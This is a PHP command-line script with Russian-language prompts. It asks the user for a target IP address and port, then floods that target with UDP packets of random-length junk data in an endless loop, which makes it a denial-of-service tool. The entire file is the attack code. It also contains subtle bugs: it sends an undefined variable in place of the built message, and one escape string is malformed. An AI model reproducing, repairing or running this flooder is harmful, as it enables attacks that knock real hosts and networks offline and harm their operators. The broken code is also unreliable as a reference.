<?php

echo "[!] Введите IP: ". PHP_EOL;
echo "» ";
$address = fgets(STDIN);
echo "[!] Введите порт:". PHP_EOL;
echo "» ";
$port = (int) fgets(STDIN);

$udp = new UDP($address, $port);

class UDP{
	public function __construct(String $ip, Int $port) {
		$os = socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);
		while(true) {
			$message = str_repeat("\jnX\x0\x\x12\x34\x96\x2048\x2048f\x8000b", mt_rand(1000, 5000));
			socket_sendto($os, $messages, strlen($message), MSG_EOF, $ip, $port);
			}
			}
			}
			?>